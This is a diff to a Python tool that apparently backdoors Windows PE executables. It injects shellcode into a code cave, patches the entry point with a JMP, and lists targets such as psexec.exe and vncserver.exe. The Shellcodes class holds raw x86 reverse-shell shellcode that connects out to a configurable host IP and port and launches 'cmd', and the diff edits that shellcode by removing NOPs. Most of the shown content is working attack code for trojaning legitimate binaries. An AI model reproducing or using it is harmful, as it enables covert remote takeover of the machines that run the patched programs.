@@ -186,6 +186,7 @@ op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
             '0x01c8': 2, '0x01c9': 2, '0x01ca': 2, '0x01cb': 2,
             '0x01cc': 2, '0x01cd': 2, '0x01ce': 2, '0x01cf': 2,
             '0x0f34': 2,
+            '0x2b': 2,
             '40': 1, '0x41': 1, '0x42': 1, '0x43': 1,
             '0x44': 1, '0x45': 1, '0x46': 1, '0x47': 1,
             '0x48': 1, '0x49': 1, '0x4a': 1, '0x4b': 1,
@@ -195,7 +196,7 @@ op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
             '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
             '0x5c': 1, '0x5d': 1, '0x5e': 1, '0x5f': 1,
             '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
-            '0x6203': 2,
+            '0x6203': 2, '0x66': 1, '0x623a': 2,
             '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
             '0x6208': 2, '0x6209': 2, '0x6200a': 2, '0x620b': 2,
             '0x620c': 3,
@@ -538,20 +539,20 @@ class Shellcodes():
                 "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                 "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
                 "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
-                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\x90\xff\xd5\x50\x50" #
+                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50" #
                 "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                 "\x68")
         shellcode += self.hostip  # IP
         shellcode += ("\x68\x02\x00")
         shellcode += struct.pack('!h', self.PORT)  # PORT
         shellcode += ("\x89\xe6\x6a\x10\x56"
-                "\x57\x68\x99\xa5\x74\x61\x90\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" #
+                "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" #
                 "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                 "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                 "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                 #The NOP in the line below allows for continued execution.
                 "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
-                "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\x90\x90\x90\xff\xd5\x3c\x06\x7c\x0a\x80" #
+                "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80" #
                 "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                 "\x81\xc4\xfc\x01\x00\x00"  # ADD ESP 1FC (To align the stack)
                 "\x9d\x61")  # restore the stack 
@@ -579,7 +580,7 @@ def pe32_entry_instr(TrackingAddress, fileItems):
     ImpList = []
     while True:
         InstrSets = {}
-
+        fileItems['VirtualStartingPoint']
         found_value = False
         for i in range(1, 5):
             f.seek(fileItems['LocOfEntryinCode'] + count)
@@ -598,10 +599,11 @@ def pe32_entry_instr(TrackingAddress, fileItems):
                 CurrInstr = struct.unpack('!I', f.read(i))[0]
                 # print i, hex(CurrInstr)
             if hex(CurrInstr) in op_codes:
+                #print hex(CurrInstr)
                 found_value = True
                 #print "length:", op_codes[hex(CurrInstr)]
                 instr_length = op_codes[hex(CurrInstr)] - i
-                #print "instr_length",instr_length
+                #print "instr_length", instr_length
                 if instr_length == 5:
                     InstrSets[CurrInstr] = (struct.unpack('<BBBBB',
                                             f.read(5))[0])
@@ -661,9 +663,9 @@ def patch_initial_instructions(fileItems, ImpList, count_bytes):
     #This is the JMP command in the beginning of the
     #code entry point that jumps to the codecave
     f.write(struct.pack('=B', int('E9', 16)))
-    
+
     f.write(struct.pack('<I', fileItems['JMPtoCodeAddress']))
-    #align the stack if the     first OpCode+instruction is less
+    #align the stack if the first OpCode+instruction is less
     #than 5 bytes fill with nops to align everything. Not a for loop.
     FrstOpCode = ImpList[0][1].keys()[0]
     #print "FrstOpCode", hex(FrstOpCode)
@@ -1400,7 +1402,7 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                        #'rpcapd.exe':
                        #[('rpcapd.exe'), None, False],
                        'psexec.exe': [('psexec.exe',), 'PSEXESVC.exe', False],
-                       'vncserver.exe': 
+                       'vncserver.exe':
                        [('vncserver.exe', ), 'vncserver', True],
                        # must append code cave for vmtoolsd.exe
                        'vmtoolsd.exe':
